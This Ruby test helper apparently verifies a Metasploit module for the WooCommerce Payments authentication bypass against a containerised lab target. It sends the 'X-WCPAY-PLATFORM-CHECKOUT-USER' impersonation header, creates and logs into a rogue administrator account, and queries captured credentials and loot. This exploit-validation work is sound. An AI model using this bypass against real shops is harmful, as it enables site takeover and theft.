# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'nokogiri'
require 'open3'
require 'time'
require 'uri'

# Independent vendor, identity, account/login and reporting controls.
module WoocommercePaymentsNative
  def payments_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-woocommerce-payments.json'), JSON.pretty_generate(@payments)) if @payments
  end

  def payments_command(label, role, *arguments)
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', role == 'app' ? 'www-data' : 'root', role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @payments.fetch(:commands) << { label: label, argv: argv, output_base64: Base64.strict_encode64(output.b), stderr: error, exit: status.exitstatus }
    payments_save
    raise "Native WooPayments control failed: #{label}: #{error}" unless status.success?

    output
  end

  def payments_identity(label, *)
    identity = JSON.parse(payments_command(label, 'app', 'php', '/opt/module-target/control.php', *))
    @payments.fetch(:identities) << { label: label, data: identity }
    payments_save
    expect(identity.values_at('core', 'php', 'uid', 'database', 'role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
    expect(identity.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(identity.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(identity.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    expect(identity.fetch('archive_sha256')).to eq(@catalog.fetch('sha256'))
    expect(identity.fetch('installed_sha256')).to eq(@mode == 'absent' ? {} : @catalog.fetch('installed_sha256'))
    expect(identity.values_at('version', 'active_plugins', 'woocommerce_class', 'platform_filter_priority')).to eq([
      @mode == 'absent' ? nil : @release,
      @mode == 'enabled' ? ['woocommerce-payments/woocommerce-payments.php'] : [],
      false, @vulnerable ? 10 : false
    ])
    expect(identity.values_at('prefix', 'mode', 'table_prefix')).to eq([@prefix, @mode, 'wp_'])
    expect(identity.fetch('permalink_structure').empty?).to eq(ENV.fetch('WOO_PAYMENTS_PLAIN', '0') == '1')
    identity
  end

  def payments_http(label, path, data: nil, headers: {}, form: false)
    request = data ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request['Host'] = 'module-target.test'
    headers.each { |key, value| request[key] = value }
    if data
      request['Content-Type'] = form ? 'application/x-www-form-urlencoded' : 'application/json'
      request.body = form ? URI.encode_www_form(data) : data.to_json
    end
    endpoint = target_endpoint('app')
    connection = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    connection.open_timeout = 5
    connection.read_timeout = 20
    connection.max_retries = 0
    response = connection.request(request)
    @payments.fetch(:requests) << { label: label, method: request.method, path: path, headers: request.to_hash, body_base64: Base64.strict_encode64(request.body.to_s.b), code: response.code, response_headers: response.to_hash, response_base64: Base64.strict_encode64(response.body.to_s.b) }
    payments_save
    response
  end

  def payments_resources(phase)
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |file|
        output = payments_command(phase + '-' + role + '-' + file, role, 'cat', '/sys/fs/cgroup/' + file)
        values = output.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        @payments.fetch(:resources) << { phase: phase, role: role, file: file, values: values }
        payments_save
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if file == 'memory.events'
        expect(values.fetch('max')).to eq(0) if file == 'pids.events'
      end
    end
  end

  def payments_route(suffix)
    # This native route works independently of Apache pretty permalinks.
    @prefix + '/?rest_route=' + URI.encode_www_form_component('/wp/v2/' + suffix)
  end

  def payments_verify_account(label, username, password, email)
    created = payments_identity(label + '-password', 'password', username, password)
    row = created.fetch('users').find { |user| user.fetch('user_login') == username }
    expect(row).not_to be_nil
    expect(row.values_at('roles', 'user_email', 'create_users', 'manage_options')).to eq([['administrator'], email, true, true])
    expect(created.fetch('password_check')).to eq('ID' => row.fetch('ID'), 'valid' => true)
    login = payments_http(label + '-login-form', @prefix + '/wp-login.php')
    expect(login.code).to eq('200')
    cookies = Array(login.get_fields('set-cookie')).map { |value| value.split(';', 2).first }
    authenticated = payments_http(label + '-password-login', @prefix + '/wp-login.php', data: {
      'log' => username, 'pwd' => password, 'wp-submit' => 'Log In', 'testcookie' => '1',
      'redirect_to' => 'http://module-target.test' + @prefix + '/wp-admin/'
    }, headers: { 'Cookie' => cookies.join('; ') }, form: true)
    expect(authenticated.code).to eq('302')
    signed = Array(authenticated.get_fields('set-cookie')).map { |value| value.split(';', 2).first }
    expect(signed.any? { |value| value.start_with?('wordpress_logged_in_') }).to be(true)
    page = payments_http(label + '-admin-page', @prefix + '/wp-admin/users.php', headers: { 'Cookie' => signed.join('; ') })
    expect(page.code).to eq('200')
    # Derived from the real native capture: user rows carry id="user-ID".
    element = Nokogiri::HTML(page.body).at_css('tr#user-' + row.fetch('ID').to_s)
    expect(element&.text).to include(username)
    row
  end

  def payments_native_gate(phase)
    original = payments_identity(phase + '-identity')
    login = payments_http(phase + '-login-page', @prefix + '/wp-login.php')
    expect(login.code).to eq('200')
    expect(login.body).to include('name="log"', 'name="pwd"')
    expect(payments_http(phase + '-home', @prefix + '/').code).to eq('200')
    readme = payments_http(phase + '-readme', @prefix + '/wp-content/plugins/woocommerce-payments/readme.txt')
    expect(readme.code).to eq(@mode == 'absent' ? '404' : '200')
    expect(readme.body).to include(@release) unless @mode == 'absent'
    { 'anonymous' => nil, 'administrator' => '1', 'author' => '2', 'missing-user' => '99999' }.each do |label, identifier|
      headers = identifier ? { 'X-WCPAY-PLATFORM-CHECKOUT-USER' => identifier } : {}
      response = payments_http(phase + '-' + label, payments_route('users/me') + '&context=edit', headers: headers)
      if @vulnerable && %w[1 2].include?(identifier)
        data = JSON.parse(response.body)
        expect(response.code).to eq('200')
        expect(data.fetch('id')).to eq(Integer(identifier))
        expect(data.fetch('capabilities').fetch('create_users')).to be(true) if identifier == '1'
      else
        expect(%w[401 403]).to include(response.code)
      end
    end
    username = 'native_payments_probe'
    password = 'Module-target-native+2026!'
    email = 'native-payments@example.test'
    payload = { username: username, password: password, email: email, roles: ['administrator'] }
    { 'anonymous' => nil, 'author' => '2', 'administrator' => '1' }.each do |label, identifier|
      response = payments_http(phase + '-' + label + '-create', payments_route('users'), data: payload, headers: identifier ? { 'X-WCPAY-PLATFORM-CHECKOUT-USER' => identifier } : {})
      if @vulnerable && identifier == '1'
        expect(response.code).to eq('201')
        expect(JSON.parse(response.body).values_at('username', 'roles')).to eq([username, ['administrator']])
        payments_verify_account(phase + '-native', username, password, email)
        expect(payments_identity(phase + '-cleanup', 'delete', username)).to eq(original)
      else
        expect(%w[401 403]).to include(response.code)
      end
    end
    expect(payments_identity(phase + '-restored')).to eq(original)
    payments_resources(phase)
    @payments.fetch(:controls) << { phase: phase, genuine_creation_and_password_login: @vulnerable, passed: true }
    payments_save
    original
  end

  def payments_sql(query)
    payments_command('reporting-sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def payments_workspace(name)
    raise ArgumentError, 'Invalid WooPayments reporting workspace' unless name.match?(/\Apayments_\d+_[a-z0-9_]+\z/)

    expect(console_command('workspace -a ' + name)).to include(name)
    @payments[:workspace] = name
    payments_save
  end

  def payments_reports
    workspace = @payments.fetch(:workspace)
    raise ArgumentError, 'Invalid WooPayments reporting workspace' unless workspace.match?(/\Apayments_\d+_[a-z0-9_]+\z/)

    credentials = JSON.parse(payments_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS address,
          l.id AS login_id,l.status,l.access_level,l.last_attempted_at
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id
        LEFT JOIN metasploit_credential_logins l ON l.core_id=c.id AND l.service_id=s.id WHERE w.name='#{workspace}'
      ) row
    SQL
    vulns = JSON.parse(payments_sql(<<~SQL))
      SELECT coalesce(json_agg(row),'[]'::json) FROM (
        SELECT v.name,v.service_id,s.name AS service,s.port,host(h.address::inet) AS address,
          ARRAY(SELECT ref.name FROM refs ref JOIN vulns_refs vr ON vr.ref_id=ref.id WHERE vr.vuln_id=v.id ORDER BY ref.name) refs
        FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id
        LEFT JOIN services s ON s.id=v.service_id WHERE w.name='#{workspace}' ORDER BY v.id
      ) row
    SQL
    loot = JSON.parse(payments_sql("SELECT coalesce(json_agg(l.path),'[]'::json) FROM loots l JOIN workspaces w ON w.id=l.workspace_id WHERE w.name='#{workspace}'"))
    result = { 'credentials' => credentials, 'vulns' => vulns, 'loot' => loot }
    @payments.fetch(:reports) << { workspace: workspace, data: result }
    payments_save
    result
  end
end
